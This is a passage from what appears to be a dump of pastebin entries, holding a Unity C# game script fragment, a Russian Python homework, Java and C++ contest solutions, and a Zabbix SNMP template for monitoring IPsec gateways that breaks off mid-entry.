            ringObject.GetComponent<MeshRenderer>().material = GetMaterialForBallColor(ballColor);
        }
    }

    private Material GetMaterialForBallColor(BallColor ballColor)
    {
        // Implement logic to return the corresponding target material based on ball color
        // You can use a switch statement or another method to map ball colors to target materials
        // For simplicity, let's assume you have a dictionary for this mapping

        Dictionary<BallColor, Material> ballColorToMaterialMap = new Dictionary<BallColor, Material>
    {
        { BallColor.Blue, blueMaterial },
        { BallColor.Green, greenMaterial },
        { BallColor.Purple, purpleMaterial },
                { BallColor.Red, redMaterial },
        // Add more entries for other colors
    };

        // Return the corresponding material
        return ballColorToMaterialMap[ballColor];
    }


    public void ShowObstacleTutorial()
    {
        obstacleTutorialPanel.SetActive(true);
    }

    public void HideObstacleTutorial()
    {
        PlayerPrefs.SetInt(""ObstacleTutorial"", 1);
        obstacleTutorialHand.DOFade(0, .25f);
        tapHereText.DOFade(0, .25f);
        textPanelText.DOFade(0, .25f);
        textPanelImage.DOFade(0, .25f);
        textPanelArrow.DOFade(0, .25f);
    }
}
"
nQjJUFvj,hw a,adyaadyaadya,Python,Monday 19th of February 2024 03:49:30 AM CDT,"a = list(map(int, input('Введите 10 элементов масссива через пробел: ').split()))
print('Элементы массива: ', *a)
k = 0  # счетчик четных элементов массива
sum = 0  # сумма четных элементов массива

for b in a:
    if b % 2 == 0:
        k += 1
        sum += b
print(""Среднее арифметическое: "", sum / k)  # выводим среднее арифметическое четных элементов"
KBBAeQMS,Soccer Prediction Betting Tips 19022024,livebetpro,PHP,Monday 19th of February 2024 03:30:04 AM CDT,https://www.livebetpro.com/soccer-prediction-betting-tips-19022024/
zjpzkrwt,Untitled,a_chn,Java,Monday 19th of February 2024 02:24:50 AM CDT,"// Question 2
import java.io.*;
import java.util.*;
 
public class a {
 
    private static class State implements Comparable<State> {
        private long x;
        private long y;
        private int time;
 
        public State(long x, long y, int time) {
            this.x = x;
            this.y = y;
            this.time = time;
        }
 
        public int compareTo(State a) {
            return this.time - a.time;
        }
    }

    static boolean innocent(State grazing, State alibi) {
        long d1 = Math.abs(grazing.x - alibi.x);
        long d2 = Math.abs(grazing.y - alibi.y);
        long d3 = Math.abs(grazing.time - alibi.time);
        return (d1 * d1 + d2 * d2) > (d3 * d3);
    }
 
    public static void main(String[] args) throws IOException {
        // BufferedReader br = new BufferedReader(new FileReader(""test.in""));
        // PrintWriter out = new PrintWriter(new File(""test.out""));
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        StringTokenizer st = new StringTokenizer(br.readLine());
 
        int g = Integer.parseInt(st.nextToken());
        int n = Integer.parseInt(st.nextToken());
 
        ArrayList<State> grazings = new ArrayList<State>();
 
        for(int i = 0; i < g; i++) {
            st = new StringTokenizer(br.readLine());
            int x = Integer.parseInt(st.nextToken());
            int y = Integer.parseInt(st.nextToken());
            int t = Integer.parseInt(st.nextToken());
            grazings.add(new State(x, y, t));
        }
 
        ArrayList<State> alibis = new ArrayList<State>();
 
        for(int i = 0; i < n; i++) {
            st = new StringTokenizer(br.readLine());
            int x = Integer.parseInt(st.nextToken());
            int y = Integer.parseInt(st.nextToken());
            int t = Integer.parseInt(st.nextToken());
            alibis.add(new State(x, y, t));
        }
 
        Collections.sort(grazings);
 
        int numInnocent = 0;
 
        for(State alibi: alibis) {
            int lower = 0;
            int upper = g - 1;
            while(lower != upper) {
                int mid = (lower + upper + 1)/2;
                if(grazings.get(mid).time <= alibi.time) {
                    lower = mid;
                }
                else {
                    upper = mid - 1;
                }
            }
 
            State grazing = grazings.get(lower);
            boolean grazing1Check = innocent(grazing, alibi);
 
            lower = 0;
            upper = g-1;
            while(lower != upper) {
                int mid = (lower + upper)/2;
                if(grazings.get(mid).time >= alibi.time) {
                    upper = mid;
                }
                else {
                    lower = mid + 1;
                }
            }
 
            grazing = grazings.get(lower);
            boolean grazing2Check = innocent(grazing, alibi);
 
            if(grazing1Check || grazing2Check) {
                numInnocent++;
            }
        }
 
        System.out.println(numInnocent);
        // out.close();
    }
}"
ED2R76jD,CheckCoinConbinations,Miyago9267,C++,Monday 19th of February 2024 01:43:07 AM CDT,"// #include <bits/stdc++.h>
# include <iostream>
# include <vector>
# include <algorithm>
#define endl ""\n""
#define endll ""\n\n""
#define pb push_back
#define IO ios_base::sync_with_stdio(0)
#define ll long long
#define inf 0x3f3f3f3f
#define MAXN maxn
#define MODN modn

using namespace std;

// ---------------------------------------------------------------- //

class Solution {
    public:
        /*
            * @param totalCost: 總金額
            * @param curList: 幣值列表
            * @return: return 對應金額的組合數 為0時return -1
        */
        static int getAllChoice(int totalCost, vector<int> curList) {
            sort(curList.begin(), curList.end());

            vector<int> dp = vector<int>(totalCost+1, 0);
            dp[0] = 1;

            for (auto cur:curList) {
                for (int i = cur ; i <= totalCost ; ++i) {
                    dp[i] += dp[i-cur];
                }
            }

            return dp[totalCost] ? dp[totalCost] : -1;
        }
    private:
};

signed main() {
    IO;

    int totalCost = 100;
    vector<int> curList = {50, 10, 5};

    cout << Solution::getAllChoice(totalCost, curList) << endl;

    return EXIT_SUCCESS;
}"
5uzruGBp,CheckMahjongWin,Miyago9267,C++,Monday 19th of February 2024 01:41:25 AM CDT,"// #include <bits/stdc++.h>
#include <iostream>
#include <vector>
#include <algorithm>
#define endl ""\n""
#define endll ""\n\n""
#define pb emplace_back
#define IO ios_base::sync_with_stdio(0)
#define ll long long
#define inf 0x3f3f3f3f
#define MAXN maxn
#define MODN modn

using namespace std;

// ---------------------------------------------------------------- //

class Solution {
    public:
        static Solution& getInstance() {
            static Solution instance;
            return instance;
        }

        /*
            * @param cardList 現有牌組
            * @return: return 聽牌的可能牌組 不存在則返回false
        */

        static string checkMajouReady(vector<int> handCardList) {
            // 牌數不是7張直接回傳false
            if (handCardList.size() != 7)
                return ""false"";

            string waitFor = """";

            for (auto i = 1 ; i < 10 ; ++i) {
                vector<int> temp = handCardList;
                temp.pb(i);
                if (getInstance().checkCanWin(temp))
                    waitFor += to_string(i);
            }

            if (waitFor.empty())
                return ""false"";
            else
                return waitFor;
        }

        bool checkPongAndSeq(vector<int>& handCard) {
            if (handCard.empty())
                return true;

            int sameCount = std::count(handCard.begin(), handCard.end(), handCard[0]);

            if (sameCount >= 3) {
                vector<int> temp = handCard;
                temp.erase(temp.begin(), temp.begin() + 3);
                if (checkPongAndSeq(temp))
                    return true;
            }

            auto it1 = find(handCard.begin(), handCard.end(), handCard[0]+1);
            auto it2 = find(handCard.begin(), handCard.end(), handCard[0]+2);

            if (it1 != handCard.end() && it2 != handCard.end()){
                vector<int> temp = handCard;
                temp.erase(find(temp.begin(), temp.end(), handCard[0]));
                temp.erase(find(temp.begin(), temp.end(), handCard[0]+1));
                temp.erase(find(temp.begin(), temp.end(), handCard[0]+2));
                if (checkPongAndSeq(temp))
                    return true;
            }

            return false;
        }

        bool checkCanWin(vector<int>& handCard) {
            sort(handCard.begin(), handCard.end());
            for (auto i = 0 ; i < handCard.size() ; ++i) {
                for (auto j = i+1 ; j < handCard.size() ; ++j) {
                    if (handCard[i] == handCard[j]){
                        vector<int> temp = handCard;
                        temp.erase(temp.begin() + j);
                        temp.erase(temp.begin() + i);
                        if (checkPongAndSeq(temp))
                            return true;
                    }
                }
            }

            return false;
        }
};

signed main() {
    IO;

    string s; cin >> s;
    vector<int> cardList;
    for (auto c:s){
        cardList.pb(c-'0');
    }

    cout << Solution::checkMajouReady(cardList) << endl;

    return EXIT_SUCCESS;
}"
DABzM6J1,S-zbx,Chitashi,JSON,Monday 19th of February 2024 01:33:06 AM CDT,"{
    ""zabbix_export"": {
        ""version"": ""6.4"",
        ""template_groups"": [
            {
                ""uuid"": ""5a36b0142b6e4342ab509d6d2330f7de"",
                ""name"": ""Templates/Cryptography devices (SKZI)""
            }
        ],
        ""templates"": [
            {
                ""uuid"": ""e1ed491d16e94ad0abfd3a1993ec9bc2"",
                ""template"": ""S-Terra Gates SNMPv2"",
                ""name"": ""S-Terra Gates SNMPv2"",
                ""description"": ""Template version: 1.7"",
                ""groups"": [
                    {
                        ""name"": ""Templates/Cryptography devices (SKZI)""
                    }
                ],
                ""items"": [
                    {
                        ""uuid"": ""c0f7c38c64274b9bb833a139265b2b39"",
                        ""name"": ""Number of active ISAKMP SAs"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalActiveTunnels.0"",
                        ""key"": ""cikeGlobalActiveTunnels"",
                        ""delay"": ""30s"",
                        ""description"": ""The number of currently active IPsec Phase-1 IKE Tunnels.\n\n\u0412\u0441\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u043d\u0430 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u0435 ISAKMP SA."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""b4c79705a32849eb8684c635c32d8d29"",
                        ""name"": ""Number of failed IPsec Phase-1 IKE authentications"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalAuthFails.0"",
                        ""key"": ""cikeGlobalAuthFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of authentications which ended in failure by all current and previous IPsec Phase-1 IKE Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043d\u0435\u0443\u0434\u0430\u0447\u043d\u044b\u0445 \u0441\u0435\u0441\u0441\u0438\u0439 \u043f\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044e ISAKMP SA, \u0432 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u043d\u0435 \u043f\u0440\u043e\u0448\u043b\u0430 \u0430\u0443\u0442\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u044f."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""797cc672c3e54072a50af0b1a697adbb"",
                        ""name"": ""Number of failed IPsec Phase-1 IKE decryptions"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalDecryptFails.0"",
                        ""key"": ""cikeGlobalDecryptFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of decryptions which ended in failure by all current and previous IPsec Phase-1 IKE Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e IKE-\u0441\u0435\u0441\u0441\u0438\u0439, \u043d\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u0432\u0448\u0438\u0445\u0441\u044f \u043f\u043e \u043f\u0440\u0438\u0447\u0438\u043d\u0435 \u043e\u0448\u0438\u0431\u043a\u0438 \u0440\u0430\u0441\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u0438\u044f \u043f\u0430\u043a\u0435\u0442\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""9267fda28c0a4125b920dc7d183c7c82"",
                        ""name"": ""Number of failed IPsec Phase-1 IKE hash validations"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalHashValidFails.0"",
                        ""key"": ""cikeGlobalHashValidFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of hash validations which ended in failure by all current and previous IPsec Phase-1 IKE Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043d\u0435\u0443\u0434\u0430\u0447\u043d\u044b\u0445 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0439 \u043f\u043e \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0445\u044d\u0448-\u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0432\u043e \u0432\u0441\u0435\u0445 IKE \u0441\u0435\u0441\u0441\u0438\u044f\u0445."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""468994b5198d4715bcb038a86f97954c"",
                        ""name"": ""Number of dropped ISAKMP packets (In)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalInDropPkts.0"",
                        ""key"": ""cikeGlobalInDropPkts"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets which were dropped during receive processing by all currently and previously active IPsec Phase-1 IKE Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e ISAKMP-\u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043e\u0442\u0432\u0435\u0440\u0433\u043d\u0443\u0442\u044b\u0445 \u0432 \u0442\u0435\u0447\u0435\u043d\u0438\u0435 \u0432\u0441\u0435\u0445 IKE-\u0441\u0435\u0441\u0441\u0438\u0439 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""cc6fced1c44943fe9b226ebf1e9a07b7"",
                        ""name"": ""Number of failed locally initiated IPsec Phase-1 IKE Tunnels"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalInitTunnelFails.0"",
                        ""key"": ""cikeGlobalInitTunnelFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-1 IKE Tunnels which were locally initiated and failed to activate.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0438\u043d\u0438\u0446\u0438\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0445 \u0441\u0435\u0441\u0441\u0438\u0439 \u043f\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044e ISAKMP SA, \u0437\u0430\u0432\u0435\u0440\u0448\u0438\u0432\u0448\u0438\u0445\u0441\u044f \u043d\u0435\u0443\u0434\u0430\u0447\u0435\u0439."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""1c2c32025d1645228a246b3a621660ad"",
                        ""name"": ""Number of locally initiated IPsec Phase-1 IKE Tunnels"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalInitTunnels.0"",
                        ""key"": ""cikeGlobalInitTunnels"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-1 IKE Tunnels which were locally initiated.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0445 ISAKMP SA \u0432 \u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435 \u0438\u043d\u0438\u0446\u0438\u0430\u0442\u043e\u0440\u0430 (\u0442.\u0435. \u043f\u043e \u0438\u043d\u0438\u0446\u0438\u0430\u0442\u0438\u0432\u0435 \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u043e\u0439 \u0441\u0442\u043e\u0440\u043e\u043d\u044b)."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""33f5529454ca4e0184d78eca8f2fa974"",
                        ""name"": ""Number of invalid IPsec Phase-2 exchanges (In)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalInP2ExchgInvalids.0"",
                        ""key"": ""cikeGlobalInP2ExchgInvalids"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-2 exchanges which were received and found to be invalid by all currently and previously active IPsec Phase-1 IKE Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e IKE-\u0441\u0435\u0441\u0441\u0438\u0439 \u043f\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044e IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439, \u0438\u043d\u0438\u0446\u0438\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0445 \u043f\u0430\u0440\u0442\u043d\u0451\u0440\u0430\u043c\u0438, \u043d\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u0432\u0448\u0438\u0445\u0441\u044f \u043f\u043e \u043f\u0440\u0438\u0447\u0438\u043d\u0435 \u043e\u0448\u0438\u0431\u043a\u0438 \u043e\u0431\u043c\u0435\u043d\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""ff891412662b4f8ea59faa10765ba869"",
                        ""name"": ""Number of rejected IPsec Phase-2 exchanges (In)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalInP2ExchgRejects.0"",
                        ""key"": ""cikeGlobalInP2ExchgRejects"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-2 exchanges which were received and rejected by all currently and previously active IPsec Phase-1 IKE Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e IKE-\u0441\u0435\u0441\u0441\u0438\u0439 \u043f\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044e IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439, \u0438\u043d\u0438\u0446\u0438\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0445 \u043f\u0430\u0440\u0442\u043d\u0451\u0440\u0430\u043c\u0438, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043d\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043b\u0438\u0441\u044c \u043f\u043e \u043f\u0440\u0438\u0447\u0438\u043d\u0435 \u0440\u0430\u0441\u0441\u043e\u0433\u043b\u0430\u0441\u043e\u0432\u0430\u043d\u0438\u044f \u043f\u043e\u043b\u0438\u0442\u0438\u043a \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""1663b992bb11451ea0bb53a153527d5e"",
                        ""name"": ""Number of successful Quick Modes as a responder"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalInP2Exchgs.0"",
                        ""key"": ""cikeGlobalInP2Exchgs"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-2 exchanges received by all currently and previously active IPsec Phase-1 IKE Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u044b\u0445 Quick Modes \u0432 \u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435 \u0440\u0435\u0441\u043f\u043e\u043d\u0434\u0435\u0440\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""38d4ec1c629049b8a032c34ea83e2a2b"",
                        ""name"": ""Number of received ISAKMP packets"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalInPkts.0"",
                        ""key"": ""cikeGlobalInPkts"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets received by all currently and previously active IPsec Phase-1 IKE Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e ISAKMP-\u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u0432 \u0442\u0435\u0447\u0435\u043d\u0438\u0435 \u0432\u0441\u0435\u0445 IKE-\u0441\u0435\u0441\u0441\u0438\u0439 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""0f04ee42da854aa8b8bc9c7d4222a4c7"",
                        ""name"": ""Number of non-existent SA failures in IPsec Phase-1 IKE"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalNoSaFails.0"",
                        ""key"": ""cikeGlobalNoSaFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of non-existent Security Association in failures which occurred during processing of all current and previous IPsec Phase-1 IKE Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e IKE-\u0441\u0435\u0441\u0441\u0438\u0439, \u043d\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u0432\u0448\u0438\u0445\u0441\u044f \u043f\u043e \u043f\u0440\u0438\u0447\u0438\u043d\u0435 \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f\nISAKMP \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""3e8562d9e8264039b146cec508f70c84"",
                        ""name"": ""Number of dropped ISAKMP packets (Out)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalOutDropPkts.0"",
                        ""key"": ""cikeGlobalOutDropPkts"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets which were dropped during send processing by all currently and previously active IPsec Phase-1 IKE Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e ISAKMP-\u043f\u0430\u043a\u0435\u0442\u043e\u0432 \u0432 \u0442\u0435\u0447\u0435\u043d\u0438\u0435 \u0432\u0441\u0435\u0445 IKE-\u0441\u0435\u0441\u0441\u0438\u0439 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0431\u044b\u043b\u0438 \u0433\u043e\u0442\u043e\u0432\u044b \u043a \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0435, \u043d\u043e \u043f\u043e \u043a\u0430\u043a\u0438\u043c-\u0442\u043e \u043f\u0440\u0438\u0447\u0438\u043d\u0430\u043c \u043d\u0435 \u0431\u044b\u043b\u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""49403d0ad064417cbd910a0049799765"",
                        ""name"": ""Number of invalid IPsec Phase-2 exchanges (Out)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalOutP2ExchgInvalids.0"",
                        ""key"": ""cikeGlobalOutP2ExchgInvalids"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-2 exchanges which were sent and found to be invalid by all currently and previously active IPsec Phase-1 Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0438\u043d\u0438\u0446\u0438\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0445 IKE-\u0441\u0435\u0441\u0441\u0438\u0439 \u043f\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044e IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439, \u043d\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u0432\u0448\u0438\u0445\u0441\u044f \u043f\u043e \u043f\u0440\u0438\u0447\u0438\u043d\u0435 \u043e\u0448\u0438\u0431\u043a\u0438 \u043e\u0431\u043c\u0435\u043d\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""de9e79a1fa6c4e0da5f673bb6eaef603"",
                        ""name"": ""Number of rejected IPsec Phase-2 exchanges (Out)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalOutP2ExchgRejects.0"",
                        ""key"": ""cikeGlobalOutP2ExchgRejects"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-2 exchanges which were sent and rejected by all currently and previously active IPsec Phase-1 IKE Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0438\u043d\u0438\u0446\u0438\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0445 IKE-\u0441\u0435\u0441\u0441\u0438\u0439 \u043f\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044e IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439, \u043d\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u0432\u0448\u0438\u0445\u0441\u044f \u043f\u043e \u043f\u0440\u0438\u0447\u0438\u043d\u0435 \u0440\u0430\u0441\u0441\u043e\u0433\u043b\u0430\u0441\u043e\u0432\u0430\u043d\u0438\u044f \u043f\u043e\u043b\u0438\u0442\u0438\u043a \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""90bf4d0de67640418fe89b8f0016bc0b"",
                        ""name"": ""Number of successful Quick Modes as a initiator"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalOutP2Exchgs.0"",
                        ""key"": ""cikeGlobalOutP2Exchgs"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-2 exchanges which were sent by all currently and previously active IPsec Phase-1 IKE Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u044b\u0445 Quick Modes \u0432 \u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435 \u0438\u043d\u0438\u0446\u0438\u0430\u0442\u043e\u0440\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""e4c9d51c522e4848abb227f995a88f53"",
                        ""name"": ""Number of sent ISAKMP packets"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalOutPkts.0"",
                        ""key"": ""cikeGlobalOutPkts"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets sent by all currently and previously active and IPsec Phase-1 Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e ISAKMP-\u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u0432\u044b\u0441\u043b\u0430\u043d\u043d\u044b\u0445 \u0432 \u0442\u0435\u0447\u0435\u043d\u0438\u0435 \u0432\u0441\u0435\u0445 IKE-\u0441\u0435\u0441\u0441\u0438\u0439 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""ac1197a420ea4d8a8768fff7bf6cd3ed"",
                        ""name"": ""Number of previously active ISAKMP SAs"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalPreviousTunnels.0"",
                        ""key"": ""cikeGlobalPreviousTunnels"",
                        ""delay"": ""30s"",
